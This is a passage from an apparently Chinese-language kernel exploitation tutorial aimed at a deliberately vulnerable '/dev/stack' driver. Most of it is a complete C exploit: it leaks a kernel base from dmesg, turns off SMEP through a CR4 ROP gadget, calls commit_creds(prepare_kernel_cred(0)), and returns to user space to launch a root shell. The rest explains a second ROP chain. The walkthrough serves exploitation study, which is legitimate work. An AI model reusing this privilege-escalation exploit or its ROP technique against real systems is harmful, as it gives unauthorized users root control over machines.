
```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>

struct cred;
struct task_struct;
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long stack;

unsigned long findAddr();
static void save_state();
void getroot (void);
void shell(void);

int main(int argc, char *argv[])
{
    int fd;
    unsigned char payload[300] = {0};
    unsigned char *p = payload;
    unsigned long memOffset;

    memOffset = findAddr();
    unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;
    unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;
    unsigned long getR = (unsigned long)getroot;
    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;
    unsigned long iretq = (unsigned long)memOffset-0x7AC289;
    unsigned long sh = (unsigned long)shell;

    printf("    addr[0x%llx]\n", memOffset);

    /* set value for commit_creds and prepare_kernel_cred */
    commit_creds = (commit_creds_t)(memOffset - 0xfbf6a0);
    prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xfbf2e0);

    /* open fd on /dev/vuln */
    printf("[+] Open vuln device...\n");
    if ((fd = open("/dev/stack", O_RDWR)) < 0) {
        printf("    Can't open device file: /dev/stack\n");
        exit(1);
    }

    /* payload */
    printf("[+] Construct the payload...\n");
    save_state();
    /* offset before RIP */
    memcpy(p,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",116);
    p+=116;

    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8); /* for rbp */
    p+=8;

    /* pop rax;rbx;r12;rbp;ret */
    memcpy(p,&pop_rax_rbx_r12_rbp_ret,8);
    printf("    pop rax      at 0x%lx\n", pop_rax_rbx_r12_rbp_ret);
    p+=8;
    memcpy(p,"\xf0\x06\x00\x00\x00\x00\x00\x00",8); /* SMEP OFF */
    p+=8;
    memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8); /* rbx*/
    p+=8;
    memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8); /* r12 */
    p+=8;
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8); /* rbp */
    p+=8;

    /* mov cr4, rax;rbp;ret */
    memcpy(p,&movCr4Rax_pop_rbp,8);
    printf("    mov CR4, RAX at 0x%lx\n", movCr4Rax_pop_rbp);
    p+=8;
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8); /* rbp */
    p+=8;

    /* getroot */
    memcpy(p,&getR,8);
    p+=8;

    /* swapgs;ret */
    printf("    swapgs       at 0x%lx\n", swapgs);
    memcpy(p,&swapgs,8);
    p+=8;

    /* iretq */
    printf("    iretq        at 0x%lx\n", iretq);
    memcpy(p,&iretq,8);
    p+=8;

    /*  the stack should look like this after an iretq call  RIP  CS  EFLAGS  RSP  SS  */

    /* shell */
    memcpy(p,&sh,8);
    p+=8;

    /* user_cs */
    memcpy(p,&user_cs,8);
    p+=8;
    /* user_rflags */
    memcpy(p,&user_rflags,8);
    p+=8;
    /* stack of userspace */
    register unsigned long rsp asm("rsp");
    unsigned long sp = (unsigned long)rsp;
    memcpy(p,&sp,8);
    p+=8;
    /* user_ss */
    memcpy(p,&user_ss,8);

    /* trig the vuln */
    printf("[+] Trig the vulnerablity...\n");
    write(fd, payload, 300);

    return 0;

}

unsigned long findAddr() {
    char line[512];
    char string[] = "Freeing SMP alternatives memory";
    char found[17];
    unsigned long addr=0;

    /* execute dmesg and place result in a file */
    printf("[+] Excecute dmesg...\n");
    system("dmesg > /tmp/dmesg");

    /* find: Freeing SMP alternatives memory */
    printf("[+] Find usefull addr...\n");

    FILE* file = fopen("/tmp/dmesg", "r");

    while (fgets(line, sizeof(line), file)) {
        if(strstr(line,string)) {
            strncpy(found,line+53,16);
            sscanf(found,"%p",(void**)&addr);
            break;
        }
    }
    fclose(file);

    if(addr==0) {
        printf("    dmesg error...\n");
        exit(1);
    }

    return addr;
}

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"
    );
}

void shell(void) {
    printf("[+] getuid() ...");
    if(!getuid()) {
        printf(" [root]\n[+] Enjoy your shell...\n");
        system("/bin/sh");
    } else {
        printf("[+] not root\n[+] failed !!!\n");
    }
}

/* function to get root id */
void getroot (void)
{
    commit_creds(prepare_kernel_cred(0));
}
```

## 方法二：

直接在内核空间利用地址和gadget构造`commit_creds(prepare_kernel_cred(0))`来完成提权，之后返回用户空间起shell。

### 1.ROP链

```text
pop rdi;ret
0
prepare_kernel_cred_k
pop rdx;rbx;rbp;ret
pop rbp;ret
0
rbp_data
mov rdi,rax;call rdx
commit_creds_k
swapgs;ret
iretq
```

之后就是返回用户空间起shell了

### 2.解析执行流程

▲先是调用`prepare_kernel_cred_k(0)`，然后通过将`pop rbp;ret`赋值给`rdx`，之后`mov rdi,rax`，然后`call rdx`，即调用`pop rbp;ret`，之后`ret`即可回到`commit_creds_k`。

这里较为麻烦的原因是因为`mov rdi,rax;call rdx`这个语句，需要赋值`rdi`才能进行`commit_creds`函数的执行，即将`prepare_kernel_cred_k(0)`返回值给`commit_creds`函数。

![Snipaste_2021-09-30_19-56-10](https://bbs.kanxue.com/upload/attach/202111/904686_KP4FQ7PBVJBYRTH.jpg)

赋值

![Snipaste_2021-09-30_19-57-47](https://bbs.kanxue.com/upload/attach/202111/904686_NVGDMJRMMCBU33Y.jpg)

之后又因为存在`call`这个语句，所以多了`pop rbp;ret`来将栈平衡掉，从而能够直接`ret`到`commit_creds`。

![Snipaste_2021-09-30_20-03-46](https://bbs.kanxue.com/upload/attach/202111/904686_6WV4KRKXECDPWZ8.jpg)

同样ha1vk师傅的利用`jmp`就比较简单，不过具体看gadget，有时候很难找。

### poc
